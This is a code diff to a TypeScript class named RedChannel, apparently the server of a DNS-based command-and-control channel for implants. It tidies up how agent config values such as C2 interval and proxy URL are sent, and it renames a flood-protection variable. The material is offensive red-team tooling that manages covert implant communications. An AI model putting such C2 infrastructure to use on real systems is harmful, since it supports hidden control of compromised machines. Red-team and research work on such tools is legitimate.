@@ -246,11 +246,11 @@ export default class RedChannel {
 
     sendConfigChanges(agentId: string) {
         const configProto = implant.AgentConfig.create({});
-        if (this.modules.agent.config.interval) configProto.c2IntervalMs = { value: this.modules.agent.config.interval };
-        if (this.modules.agent.config.throttle_sendq) configProto.throttleSendq = { value: this.modules.agent.config.throttle_sendq };
-        if (this.modules.agent.config.proxy_enabled) configProto.useWebChannel = { value: this.modules.agent.config.proxy_enabled };
-        if (this.modules.agent.config.proxy_key) configProto.webKey = { value: this.modules.agent.config.proxy_key };
-        if (this.modules.agent.config.proxy_url) configProto.webUrl = { value: this.modules.agent.config.proxy_url };
+        if (this.modules.agent.config.interval !== undefined) configProto.c2IntervalMs = { value: this.modules.agent.config.interval };
+        if (this.modules.agent.config.throttle_sendq !== undefined) configProto.throttleSendq = { value: this.modules.agent.config.throttle_sendq };
+        if (this.modules.agent.config.proxy_enabled !== undefined) configProto.useWebChannel = { value: this.modules.agent.config.proxy_enabled };
+        if (this.modules.agent.config.proxy_key !== undefined) configProto.webKey = { value: this.modules.agent.config.proxy_key };
+        if (this.modules.agent.config.proxy_url !== undefined) configProto.webUrl = { value: this.modules.agent.config.proxy_url };
 
         const configProtoBuffer = Buffer.from(implant.AgentConfig.encode(configProto).finish());
         // no need to send data, just the config proto
@@ -459,7 +459,7 @@ export default class RedChannel {
         this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
 
         if (question.type !== "AAAA" && question.type !== "PROXY") {
-            this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
+            // this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
             return res.end();
         }
 
@@ -470,7 +470,7 @@ export default class RedChannel {
         }
 
         // used to prevent flooding
-        const randId: string = segments[0];
+        const antiCacheValue: string = segments[0];
         const agentId: string = segments[1];
 
         if (!this.agents.has(agentId)) {
@@ -512,11 +512,10 @@ export default class RedChannel {
             return res.end();
         }
 
-        // we have already responded to this agent and rand_id combination
-        // reset the flood protection timeout
-        const floodId = agentId + randId;
+        const floodId = agentId + antiCacheValue;
         if (this.isAgentFlooding(floodId)) {
-            this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
+            // we have already responded to this agent and antiCacheValue combination
+            this.log.warn(`ignoring flood from agent: ${agentId}, antiCache: ${antiCacheValue}, command: ${command}`);
             return res.end();
         }
 
